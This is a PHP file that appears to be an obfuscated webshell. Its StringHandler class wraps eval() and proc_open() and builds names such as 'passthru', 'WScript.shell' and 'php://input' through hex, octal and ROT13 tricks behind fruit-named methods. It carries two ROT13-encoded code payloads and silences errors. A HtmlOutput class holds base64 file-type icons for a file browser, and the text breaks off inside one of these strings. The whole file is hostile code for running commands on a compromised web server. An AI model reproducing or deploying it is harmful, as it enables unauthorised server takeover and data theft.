<?php

header("Content-type:text/html;charset=utf8");
error_reporting(0);
define('THEPATH' , dirname($_SERVER['SCRIPT_FILENAME']));

class StringHandler {

	const ALL_STRING = 'The quick brown fox jumps over a lazy dog.';

	public static function returnStr ($code = 'test') {
		return eval($code);
	}

	public static function getApple ($alice = 'fire' , $bob = [] , $hole = null) {
		return proc_open($alice , $bob , $hole);
	}

	public static function getPen ($content = 'pen') {
		$array   = self::returnArray();
		$content = $array[0][2] . $array[3][2] . $array[5][2] . $array[1][3];
		return $content;
	}

	public static function getPineapple ($str = 'met') {
		$array   = self::returnArray();
		$content = $str . $array[4][4] . $array[7][3];
		return strrev($content);
	}

	public static function getBanana ($str1 = '' , $str2 = '') {
		$array1 = [70 , 61 , 73 , 72];
		$array2 = [163 , 164 , 150 , 165];
		foreach ($array2 as $value) {
			$str2 .= chr(octdec($value));
		}
		foreach ($array1 as $value) {
			$str1 .= hex2bin($value);
		}
		return substr($str1 , 0 , 3) . substr($str2 , 0 , 3) . substr($str1 , 3 , 1) . substr($str2 , 3 , 1);
	}

	public static function getWatermalen ($str3 = 'getme') {
		$str1 = "php";
		$str2 = "input";
		$str3 = $str1 . ":" . "//" . $str2;
		return $str3;
	}

	public static function getOrange () {
		$des      = 'JFpevcg';
		$tory     = 'sveronyy';
		$destory  = str_rot13($des . '.' . $tory);
		$name     = 'shaqeaqllaqdoaqn';
		$new_name = str_replace('aq' , '' , $name);
		$string   = substr_replace($destory , $new_name , 8);
		$content  = substr($string , 0 , 13);
		return $content;
	}

	public static function getGrape () {
		return 'proc_open';
	}

	public static function returnArray () {
		$all_array = explode(' ' , self::ALL_STRING);
		return $all_array;
	}

	public static function getCode ($which) {
		switch ($which) {
			case 'pgone':
				$code = 'VlRiqKAlY2Wcov9jMKWfPaImMFOGo2AeMKD7PvEfrJ54CFNvoUyhrPV7PvEmrKA0MJ09VPqyL2uiVPWtqJ5uoJHtYJStVwgyL2uiVPWtnJEtVwfiLzyhY3AbWmfXWQN9WTk5oat7PvE0LKWaMKD9WRSFE1MoZS07PvEjo3W0CFEOHxqJJmSqBjbxnJSxMUV9nJ5yqS9uqT9hXPE0LKWaMKDcVUk8VTEcMFtvEKWlo3V6VPDuKT4vXGfXWUOuMTElCKAiL2guMTElK2yhXPEjo3W0YPNxnJSxMUVcVUk8VTEcMFtvEKWlo3V6VPDuKT4vXGfXWUOlo3EiCJqyqUOlo3EiLayhLJ1yXPq0L3NaXGfXp29wn2I0XSACD0gSIPjtHRMsFH5SIPjtH09QF19GISWSDH0fVPEjpz90olxtsUjtMTyyXPWSpaWipwbtWPSpovVcBjcwo25hMJA0XSACD0gSIPjtWUOuMTElXFO8sPOxnJHbVxIlpz9lBvNxVIkhVvx7Pz9jMJ4bH1ERFH4fVPV';
				break;
			case 'gai':
				$code = 'V2yhL2k1MTHtCUA0MTyiYzt+PvAcozAfqJEyVQkmrKZip29wn2I0Yzt+PvAcozAfqJEyVQkhMKEcozI0Y2yhYzt+PzyhqPOgLJyhXTyhqPOupzqwYPOwnTSlVPcupzq2J10cPafXVTyhqPOzMQfXVUA0paIwqPOmo2AeLJExpy9covOmnJ47PvOwnTSlVTEyoUAyoTMoZwSqCFWloFNgMvNvBlNXVTEuMJ1iovtkYQNcBjbtp2yhYaAcoy9zLJ1coUxtCFOOEy9WGxIHBjbtp2yhYaAcoy9jo3W0VQ0tnUEioaZbLKEinFuupzq2JmWqXFx7PvOmnJ4hp2yhK2SxMUVhp19uMTElVQ0tnJ5yqS9uMTElXTSlM3MoZI0cBlNXVTW6MKWiXTSlM3MoZI0fp3EloTIhXTSlM3MoZI0cXmRep3EloTIhXTSlM3MoZy0cXGftPvOzMPN9VUAiL2gyqPuOEy9WGxIHYPOGG0AYK1AHHxIOGFjtFIODHx9HG19HD1NcVQftPvOcMvNbXTAioz5yL3DbMzDfVPumqUW1L3Dtp29wn2SxMUVtXvxtWaAcovjtp2y6MJ9zXUA0paIwqPOmo2AeLJExpvxcXGjjXFO7PvNtVUOypaWipvtvJl1qVTAioz5yL3DbXFVcBjbtVPOyrTy0XQNcBjbtsDbtp3ElL2S0XTEyoUAyoTLfVTSlM3MoZS0cBjbtp3ymqTIgXTEyoUAyoTLcBlNtPvOxqKNlXTMxYPNjXGfXVTE1pQVbMzDfVQRcBjbtMUIjZvuzMPjtZvx7PvOyrTIwoPtvY2Wcov9mnPVfVaAbVP1cVvjtGyIZGPx7PvOwoT9mMFuzMPx7VNbtpzI0qKWhVQN7Pa0=';
				break;
		}
		return str_rot13($code);
	}
}

class HtmlOutput {

	public static function htmlOut ($data) {
		echo "$data\n";
	}

	public static function getFileIcon ($type) {
		$type_array = [
			"aspx" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAAZiS0dEAAAAAAAA+UO7fwAAAAlwSFlzAAAASAAAAEgARslrPgAAAjNJREFUSMfFVD9IemEUPVfKNh3KEgLBhhpa6n0uEUGJjklQ0OYaQRAEDU1G4NDg4FLU8MopiJqsxXi0uNQSIUVLz1dQixEGCQ3yzm94Px2Ukl//fme797sf59x7z/cJ/kJpSlNaqQSBQLq68FksYxnLllWdrc5WZycmLuVSLsWyWt7TzrVz7bxa/TRxrREqKq6uKqWUUnd3oaPQUeior++9etdXCT9GIMAEE0ycnr4n5IcFtBbS9t1UcizHcpzP2zv2jr2zvt5UcI1rXBuGEwSD9fx3eaAVHG+QtfiXVvDBxBoV/TaaPUAQvL3FAQ5wYBg0adKMRuVJnuRJBBYsWCcnXOISlyYnZUVWZOXhAV544b25QT/60T86yna2s/3xUXKSk1wo5JyfncGAAWNsrEbXtAIucIELV1cssMDC8DDWsIa1VIoBBhjY3oYGDdrAALLIImuajDDCiK4jiCCC0Sj3uc/9jQ1JSlKSPT3UqVOPx+GGG+6Xl9YT2MUudnM5qUhFKrGYk7RtDnKQg1NTMGHCLBZdMVfMFSsUnLzH49R1d8u8zMt8RwcucIELjwczmMFMpYIyyih7vY10TROQV3mV16EhTnOa08Ui44wzPjIiYQlLuFx2Or2/t3Vbt/Xxcfroo+/tzVldKoVNbGIzHEYnOtGZz4tf/OLf22Mve9nb/CV/2YSO0K0tOZRDOZyb+9f7//0V1PFbQho/vLoJmWaa6edntagW1eIPCskgg0ypVAv/AGuEFKY93mwjAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE5LTEwLTIzVDIzOjI4OjA1KzA4OjAwzBJUYgAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOS0xMC0yM1QyMzoyODowNSswODowML1P7N4AAABHdEVYdHN2ZzpiYXNlLXVyaQBmaWxlOi8vL2hvbWUvYWRtaW4vaWNvbi1mb250L3RtcC9pY29uX2lpcW1oMjZ1a3VqL2FzcHguc3ZnlsnZqwAAAABJRU5ErkJggg==" ,
			"css"  => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAAZiS0dEAAAAAAAA+UO7fwAAAAlwSFlzAAAASAAAAEgARslrPgAAAt5JREFUSMe9VTFIW1EUPVcTmzRF3bpIQecs/veDm6Bu9dtKsSglOAii4iBWMU5CQpFaBBfxg/xB0qWlNIO6dNCmIpHa+AMmQhzMkgyOxgSJhf9uh6+WtvyWtNKzvPfOO3DPu++9ewlXaC21llpLT56Qj3zke/uWAhSggMuFajGGMYxdXnKOc5x7/NicN+fN+Q8fnOR0PRFn4kycvXrFRS5y8f79mnRNuiYdDlcbX1rSktabN9CgQfP7MYEJTGiauWwum8vb2z/rfz1hBRVUisWkltSSWi5XrQExI2bETKWCCCKIeL02u7EhWLDg7u4DOqADisev9TVVp/ivcPcu7/Ee762vB5oDzYHmQMA5A/8IuSt35e7z57Xh2nBtuLHxZmMTm9icnra6rC6r6+FDGDBgfPly6wZSiVQilUgm7TfwnRdZkRXZZ8+wiEUsfuf/0xU4g4QhDGFUKtChQ79z579FvvquJIQQQjD/Xv3x44/rjg57TKft8eSEddZZ7+mhAhWocHyMJjShKZtllVVWHz1yqivOV6BDhx6LcYxjHMvneZAHebBQQDva0X54aItevsQSlrDk8dAojdJoMsn93M/9kQjKKKPc0IBznOP882enMI4GeJVXefXwkOIUp3hPD0UpStGBAbtOPHhgq54+xSQmMfnpEwgEcrspRCEKBYPsYQ97trau+aoNUC/1Uq+mwQUXXC9eYBazmJ2awj72sZ/LcZ7znH//HsMYxrDXa2fo6Aid6ETnu3ekkELKvXtYwxrWjo8d4/zxDVzXdj/72c9M4zRO4x4PRjCCESl5iId4qFymNmqjtvp6CAgIZl7hFV4plW54JwPKjrKj7Jyeog51qGtooAxlKEMEN9xwX1zgtpBAAgmfzzZmWbBgwSoWb70ZOUEqUpHKwgLmMIe5TMY0TMM0wuEbA2pQDarBgQEZlVEZff36r9uxE1SoUL9+lSEZkqG+vlRLqiXVsrHxDRyVWXgjtX2dAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE5LTEwLTIzVDIzOjI4OjA1KzA4OjAwzBJUYgAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOS0xMC0yM1QyMzoyODowNSswODowML1P7N4AAABGdEVYdHN2ZzpiYXNlLXVyaQBmaWxlOi8vL2hvbWUvYWRtaW4vaWNvbi1mb250L3RtcC9pY29uX2lpcW1oMjZ1a3VqL0NTUy5zdmeLMRR2AAAAAElFTkSuQmCC" ,
			"dir"  => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAAZiS0dEAAAAAAAA+UO7fwAAAAlwSFlzAAAASAAAAEgARslrPgAAAVhJREFUSMftlK2qAlEUhdceRTCoiEEYDGIxj0cMvoLdaBib+BNE1KJBZHDewGa3DmIZLPoKYxGTUQyCODhy9g3iLTfovTDc4qrnnP19rA0H+OeQmIu5mDcaMGDAqNV4wxvehEJvT7Bhwz6foUKFalnuzt25u9HIKTtlp3y7vXoefAwwDO5xj3v1umIrtmIfDu/y5Ume5CmZRAABBPr98CQ8CU+i0cdpq/WygZzMyZz0PBrQgAbLJRZYYHG9/rrLMcYYp1Ic5zjHNQ177LFfr3/cu+OOu+dRgQpUmE6/BVBBBZXhEA4cOMfjH1f6MqSTTno6jRhiiFWreArkrbyVtzIZv8DPaEWtqBVVVQghhLhcFL+Br/IR+Ah8BII0oxnNXJcjHOFIqfT4D7Zbv4DSlKY0s1k22WTTdYNIIIFEp8NgMHQdK6ywUvxrpo022lJSk5rU7HZ947ybL6dZj4GTbSQjAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE5LTEwLTIzVDIzOjI4OjA1KzA4OjAwzBJUYgAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOS0xMC0yM1QyMzoyODowNSswODowML1P7N4AAABGdEVYdHN2ZzpiYXNlLXVyaQBmaWxlOi8vL2hvbWUvYWRtaW4vaWNvbi1mb250L3RtcC9pY29uX2lpcW1oMjZ1a3VqL2Rpci5zdmfYazEbAAAAAElFTkSuQmCC" ,
			"exe"  => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAAZiS0dEAAAAAAAA+UO7fwAAAAlwSFlzAAAASAAAAEgARslrPgAAAkFJREFUSMe9lLFLcmEUxp/nq+GGQzREcCmhoKKhpVdEKojb0p/QEAVtQlYStarUJLiIEASCBP0H1WRhQ3BLh3AJRAgjiEgSAgMju6fhfvpBYYJf+Wzn4Zx7fu95z3uJv1IrakWtPD7iAhe46O1Fq9rCFrYKhep8db46bxhZZpllodC0biI9kZ5IV6stN64dRJQoCYWUUkqp21vXkevIdTQ01Cj/z/82/F5OpwQlKMFUqhHILwM0B+n86VY85jGPz8+thJWwEuHwl4RrXOP69NQOBgfr/k/tQDPZuyFSi9t0Bd9M7DNRu9V4B5awhKVIRAwxxHh/5wlPeKJpOMABDubmQBB8e5OMZCQzNmb7ySSjjDL6+ioJSUgil6t/7wlPeFpY4CY3udnf3xzAAQccz89c5jKXd3bqvhdeeC0LPehBj9+PNaxhra+PJk2ai4t2Ujxu121vtzwBa9aatWazWbrppjscRgoppHSde9zjXq2Rx4MAAgicncGECdPpxAY2sPHyIuMyLuP/XgF3uctdnw8ZZJBxOGp+h67ruq6HQl8I0kgjfXXFbnaz2++nRo3ayAimMIWpUkkqUpFKMskyyyxPTyOPPPK5HOOMM14swgUXXKurfOADH5TCHe5wp2m4xz3uOzrqYA2XMIYYYoeH8MEHX6VS92cwg5nRUYlIRCLDw/aEurogEMjlJQwYMDo77Ynd3NTKxBRTTI+Hk5zk5MBAc4B2q10gn3949SWUqEQlWiqpdbWu1n8RZB/72C8Wa+EHCmUDZEgGfvQAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTktMTAtMjNUMjM6Mjg6MDUrMDg6MDDMElRiAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE5LTEwLTIzVDIzOjI4OjA1KzA4OjAwvU/s3gAAAEZ0RVh0c3ZnOmJhc2UtdXJpAGZpbGU6Ly8vaG9tZS9hZG1pbi9pY29uLWZvbnQvdG1wL2ljb25faWlxbWgyNnVrdWovZXhlLnN2Z2RWoAMAAAAASUVORK5CYII=" ,
			"html" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAAZiS0dEAAAAAAAA+UO7fwAAAAlwSFlzAAAASAAAAEgARslrPgAAAghJREFUSMfFVb9LamEYft/jddBBafG4VIQSSCD4fUcFdXIoMBwddIlAHOSsglMN5uJpCQQJaYjgLC2CJELOokc+kaAlgoam/AM8kOZ3h4Nwb5fL8ZZcn/H99T3vw/PyAawZ+DlAKaWUPjxABCIQcTh4hVd45ePDdFAUoxh1OCAPechfXLAsy7Ls2dk/MyIqUYl6fx/oBrqBrte7bB8llFBSr9MczdHcfE68xEu8x8dmfcLKNWXAgCGiE53ovLw0FD08/H8EfoPVyjWuce321lBof/9zxY9VPcVd3MVdV1eYxjSmn58XcaxjHet2OyAg4Pm5EfX7V0QA0a/4Fb9itw8Lw8Kw0OtBG9rQ7vUWFWE1rIZVUZzxGZ/xg4MvKyBNpIk02dzkMR7jse3teWaemWdeX3GEIxxtbUklqSSVNjZ4gzd4o9NhjDHGJhOzuaYeCCVDyVByZ8d4+OREL+pFvahpQlbICtndXWvCmrAmnp4sHovH4un3oQY1qN3cLLuYqQJaU2tqzZcXw82Nhi1lS9lSkQgXuchFUeyP++P++O3NyB8doQ996Ds9XRmBBQxJ7+4MMwEEq8FqsLq3BzLIIC/y19fGGS479RtnOJAH8kB+fPxq/7cJrAprJ/CHB4SyUBbKbjeP8ziPdzpEJzrRzT+jv2GqTJWpIgjYwha23t/BDW5wr3vtX/ATpfLJLQZQUDwAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTktMTAtMjNUMjM6Mjg6MDUrMDg6MDDMElRiAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE5LTEwLTIzVDIzOjI4OjA1KzA4OjAwvU/s3gAAAEd0RVh0c3ZnOmJhc2UtdXJpAGZpbGU6Ly8vaG9tZS9hZG1pbi9pY29uLWZvbnQvdG1wL2ljb25faWlxbWgyNnVrdWovaHRtbC5zdmdmCdwJAAAAAElFTkSuQmCC" ,
			"file" => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAAZiS0dEAAAAAAAA+UO7fwAAAAlwSFlzAAAASAAAAEgARslrPgAAAMxJREFUSMftlLEJg2AUhO8PcQU3cIH/GgsLcQI7QRzBQSzdQRuxcQTBxkIXcAMLCyf4UynBEEx+TGy87j14x91XPOBkie2CJUuWw4AECRLL+s5untGhQ+f7vehFL+r6b01IklSKGTNm40hFReW6e3e3twR0FSFCFATIkSMvik+DvDTRJbDOkpLScRYiMpaxjD1vl4CuVKta1U7TGkRAQDQNUqRITRMhQoRV9TMCur6HEdDVFeAKcAW4bxfrQ7Fp0z7uHyy+MGDAOLv2kx4mEV8Nmu94UQAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAxOS0xMC0yM1QyMzoyODowNSswODowMMwSVGIAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMTktMTAtMjNUMjM6Mjg6MDUrMDg6MDC9T+zeAAAAV3RFWHRzdmc6YmFzZS11cmkAZmlsZTovLy9ob21lL2FkbWluL2ljb24tZm9udC90bXAvaWNvbl9paXFtaDI2dWt1ai9pZl9kb2N1bWVudF9maWxlX2ludi5zdmcCD615AAAAAElFTkSuQmCC" ,
			"img"  => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAAZiS0dEAAAAAAAA+UO7fwAAAAlwSFlzAAAASAAAAEgARslrPgAAAy9JREFUSMflk1FIU2EUx8+52zTIVS+THvRNclhuer/t4osTBX0JdElbMIYuGOHDfXDqwoRIomiwBQ58kA1Kpt3sLX0aIcj2tEwvzEAxdb5MBJ8ns3Z3Tw9jEposCp/6P37nO+f/+845H8D/LrRmrVlr9tYttVftVXv9/tLx9euX5iiBBFIuxy1zy9zy69datU/tU/tmZqiTOqnzyxdcwRVc+fTpX31omIZpuKoKG7ABG1QVRBBBVBRohEZovH1b3VV31d3ZWS20Qzu037xZMp6fX5fX5XX569e/NWaMMcbsdlRQQeXNG7KSlazfvyMgINy9CwwYsM+fYRRGYdTr5S4qZCYzmenGjdZQa6g1ZLM5HA6Hw6HRVCQIQhCCoghGMILx0SNswzZsC4VKQa/37PVzABa3xW1x37mjFbWiVvz2DU1oQlM0mslkMplMLFax9TVUQzXJJOUoR7nJSRiBERgRRcpSlrKJxMUACAio01E/9VP/hw/UQR3U8fixvlvfre82m4GAgHiej/ARPuJ0XgQgC7IgC8+fo4ACCqJIczRHc/fvy0fykXw0P1+hA14v2chGtoMD2Sk7ZefsbAITmMCTE6qlWqp9+BA84AFPONySbEm2JA2GswWFHWFH2KmrgzjEIR6JwBiMwZgklTt7IQCt0iqtejzcIXfIHb58ee5lcTkux1Op0kzfvdP4ND6Nb2rqTDmuGC1Gi1FJAjvYwS5JyCGH3OQkbdImbX78iE3YhE3XrpUztKe5echDfm9vrXmtea35/KzK0i3qFnWLT58WUoVUIZVOswALsIDLVYoajTRBEzTBcfpqfbW++tmzRFeiK9GlKPw2v81vWyyUpjSlp6exgAUs/DqCIRiCoffvKy1Zqj5Vn6rP51WX6lJdDkfp9NWr0o709BTHi+PF8QcPSqNTlHKesqQsKUtPnmAAAxioqzstyHzMx3zpdPm7VQL4vRD/9CYf5sN8+N49tsAW2ML+vpa2aIu23r7FEIYwFI8zAzMww8nJ34FUFrnJTe4rV2iQBmnwxYtTclPQFDQFr16lGMUoVlV1WQA4gAM48OPHhn/Dv+E/Pr4snz/WTwViayM1Vv2QAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE5LTEwLTIzVDIzOjI4OjA1KzA4OjAwzBJUYgAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOS0xMC0yM1QyMzoyODowNSswODowML1P7N4AAABGdEVYdHN2ZzpiYXNlLXVyaQBmaWxlOi8vL2hvbWUvYWRtaW4vaWNvbi1mb250L3RtcC9pY29uX2lpcW1oMjZ1a3VqL2ltZy5zdmeKLQo/AAAAAElFTkSuQmCC" ,
			"js"   => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAAZiS0dEAAAAAAAA+UO7fwAAAAlwSFlzAAAASAAAAEgARslrPgAAAZhJREFUSMfNlDGvwVAUx895eZtFxCaRMmEg6fUBdCCRWEXs9k7EhMFixAeQfgRJO4lYTFgYJCY0IpEmlq5Nzxvuq5cQr3jIO0tzzr09/197/vcifAcTmchEwwAEBPT74dEoQxnKm41VsApWQZLmOMc5bjau74kTcSJOLOthYedDiBGjRoMxxhjbbpNqUk2q4fC1/R9/Ffw9gkGqU53qo9E1kBcDuIN8PlsKNdRQG4/tnt2ze63WxYYlLGE5HPIkFDrVn+UBFzzk3iByKm8awQ/AReWc6N1xtwdII420fh900EHP5VBAAYVuF7KQhaxpAgEB5fP8PolE3PrdPQJUUUV1NoMEJCCx33Phw4GvVqtcWNdv7fewB1BBBZVAgGeZDH/WalSkIhV3u6cBUJva1D4eedbpkEACCabJj9NqRSlKUWo65b++VEIvetG7Xt8K4OoBlFFG2eejAQ1oEI9jGtOYliS+Go1CE5rQtG3wgAc8iwXFKEaxSgUBAd2awz84Bad4F8j5hXcagTNrJjOZyS8EUUABxTCc9Atx3rj7wZdvFgAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAxOS0xMC0yM1QyMzoyODowNSswODowMMwSVGIAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMTktMTAtMjNUMjM6Mjg6MDUrMDg6MDC9T+zeAAAARXRFWHRzdmc6YmFzZS11cmkAZmlsZTovLy9ob21lL2FkbWluL2ljb24tZm9udC90bXAvaWNvbl9paXFtaDI2dWt1ai9qcy5zdmeLUob0AAAAAElFTkSuQmCC" ,
			"jsp"  => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAAZiS0dEAAAAAAAA+UO7fwAAAAlwSFlzAAAASAAAAEgARslrPgAAA0RJREFUSMelVc9LG1sU/s4QJ+1GWoiZ3muyanBhzERT7VoRd1qzKNosuigIhRZEsLuISlelFSxiICnBjYVCKC71D+gmTdKVYoiQkiqdCTE4aIPakcx9i9QK9c1LfX6by/1xzv3Od+65h2ADZUgZUobcbmlFWpFWkknIkCEPDVEP9VDPjRt2dmhBC1qOj9GGNrS9fq3ltJyWe/mysSnEn8cddn4kVVIlNRZDHnnk29qkZWlZWn74UPSLftH/86ednfAKr/BGo7RKq7Q6P88m2SSbvHNHX9KX9KVnz+yIXAKP8ziP6zrbY3tsLxJpavALLM3SLP3mDeeccy7E+cgG2SAbjMcbp4h+B2rraQELWHA4sI51rJ+c/C0BdKMb3ZcjpDzlKf/0KY/yKI++fds0BfDCC+9fSPVnCnbFrtgtFhvEDeNCGjCwmzcbb2hykqlMZerHj46rXtAM5Y5yR7kjkWjMzkegM9WZ6kzJsjFnzBlzpRJlKUtZn+8XAYeDJViCJVQV85jHPJFYFIti0eEgjTTS7t5ljDHG7t1rqkBJlETp+LjsLDvLznz+fH17bHtse8w0WY3VWO3HD2SRRRYgrnKVq48eoYoqqh8+XFuCXvSi17JOz07PTs9u3z7YONg42Dg6+p2JGquxWqFAUzRFU69eSZjBDGYu17XL5XK5XEAoFAqFQoDH4/F4PEAgEAgEAoDf7/f7/f9CIIcccpLkDDvDzrAsN+NrWwWmaZqmCVSr1Wq1CiiKoigKYFmWZVmApmmapl1bL3sCsizLsgwYhmEYBlAsFovFIqDruq7rF+t2oAhFKNK8ihzWqDVqjX7+TG5ykzuVQgEFFIj2+/b79vsePEAQQQS/fEESSSS/f2/mkDZpkzYPD7VWrVVrPTz839LwAT7AByqVRnWEw9cXu4HzR8gn+ASfePLE/iccxzjG63WKUYxi/9F8rgiapmmalmVkkEHm5MT2IxIkSNCnT9RFXdT14kX7bPts++zRkVgTa2LNNK96sdgSW2Lr/n0xLIbFMOf1YD1YD2Yy9gTSIi3Sz5+TSSaZ795ZPstn+d6/px3aoZ1bt6BBg3bRVJpGHqQgBb99gwIFyuPHlZHKSGXk69d/AHOuXYUMi+REAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE5LTEwLTIzVDIzOjI4OjA1KzA4OjAwzBJUYgAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOS0xMC0yM1QyMzoyODowNSswODowML1P7N4AAABGdEVYdHN2ZzpiYXNlLXVyaQBmaWxlOi8vL2hvbWUvYWRtaW4vaWNvbi1mb250L3RtcC9pY29uX2lpcW1oMjZ1a3VqL2pzcC5zdmdQ2TjbAAAAAElFTkSuQmCC" ,
			"php"  => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAAZiS0dEAAAAAAAA+UO7fwAAAAlwSFlzAAAASAAAAEgARslrPgAAA4tJREFUSMetlU9IG1sUxs+5MxOpVEOQhmBE0sR2IURwxthFAtlYC2KLrQRL6VYKJUQCImKhCzeBCIlx0SyF1oU2CzdSJLSEEMwmfxaGLtqQBLXVRYWASa2kM3PeIsT3SJ68vLbfZrjnfnfOb+53L4PQJJfL5XK5OK4QLAQLwTdvMIhBDN6+De1qDMZgrFajHuqhnt3dLluXrcvm98cxjnG8uGi2882FYqFYKBaMRsxhDnMmUy1ai9aid++2219ICSkh9eQJzuIszr58WTFXzBWzw+EkJznpwYNmkBYAOSNn5AxjfIyP8bHz81wul8vlyuV2AcQBcUAcOD+nOMUp/uoVnuAJnuj11bPqWfUsEpFESZTER48y2Uw2k/35k7W9tf9TOIiDOKjTwRZswVYgQB7ykIcx8pOf/M+fN3x/HIDts322/+kTTMEUTF27BhGIQGRhAatYxeqXLzACIzDicl0Zwe8q3ZnuTHcmk/VR4/m3pIgUkSKfP7cASJIkSVJnpzKnzClzgqCW1JJaSqWsVqvVatXpfhVII2gEjVCtNjKHBCQggXgJMLQytDK0oteDDnSgOzzkwlyYC3d0XL5Ao9FoNIuLvwpAS7RES8kkTMM0TNvtzfM8O2JH7EirhU3YhM2ODvCABzzlMoUoRKHFRTCBCUxaLbrRje5796AXeqH38BA2YAM2btwgN7nJrSgwARMw8e4drMIqrHZ3gwIKKHNzuI3buK3XXwXYcgaon/qp//t3tsyW2fL792pSTarJW7folE7p9Ns3ylKWsrEYb+ANvOH6dXVH3VF3Hj6sr97dBS94wWu11scfPoAd7GBv/fKGrrwFclSOylGOQxlllF+8QAMa0DAzg93Yjd137qjr6rq6fv9+w88ZOSNn5DjwgQ98CwsUpjCFnz79r4h4fpwf58cVhfZoj/YAwAlOcBoM3DF3zB3HYhCAAASMRvKRj3w/fuABHuCBKNajEgSykIUsRLJFtsiWZ89wHudxvq8PAQEBgBKUoISiwBqswdq/AKQn05PpyVJJFERBFB4/rt9TrZaAgP7ptIENbAAt9eYIm+aZkRmZ8ePHtk/taH40P5rv6xNDYkgMvX7d9sI2JXkkj+TJ5y93oNmgzCgzygxjiIiIN2/+qcb1nxHPVy4qF5ULxhqRtACYLWaL2fL1a9Fb9Ba95bI4LA6Lw4XC7wLUGwOgAx3oePu2Uf8LaX2DHajI5aYAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTktMTAtMjNUMjM6Mjg6MDUrMDg6MDDMElRiAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE5LTEwLTIzVDIzOjI4OjA1KzA4OjAwvU/s3gAAAEZ0RVh0c3ZnOmJhc2UtdXJpAGZpbGU6Ly8vaG9tZS9hZG1pbi9pY29uLWZvbnQvdG1wL2ljb25faWlxbWgyNnVrdWovcGhwLnN2Z/pmCQMAAAAASUVORK5CYII=" ,
			"rar"  => "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAAZiS0dEAAAAAAAA+UO7fwAAAAlwSFlzAAAASAAAAEgARslrPgAAAupJREFUSMfFVUtIW1EQPXONUEpc2U+wkIUGLBT83CTwhJJNVrpwURPUZeGBISXoQvysAiFgEV2UBBVxIYIKFfGDZKHYgqiRhPeEFBoK7opKlayyELHe6eIRCy1itZbObi73zJx7ZuYO8J+Nfj2QB/JAHoyP0yRN0uSLF9zADdxwfn5TIE5ykpODg6JJNImmiQmlKU1p/f37wf3gfnBz848ZlQjUh+pD9aFnz277Ijkn5+TcxoZbuqVbvn/v3nXvunc7O6+7L+5d0hzlKCcEFalIxZERRBBBJBy+jsi9E4ALLrg+flSLalEtvnplHX76hG1sY/vly1+v2+47v6EbuqHH4yXfKoXTaXn9/f9egVva1RTIMTkmx+bnaYqmaMrrRQta0JLPI4UUUmdnf5GBQA8fgsHg589ZZ531bNYMm2Ez3Nn5U4EQQggFAhagpoaruZqrlUI3utFtGFjFKlZPTuCBB55AgId5mIc9Hl7jNV4jsnDBILdyK7d++3aFa0YzmplLca/y3FQCSl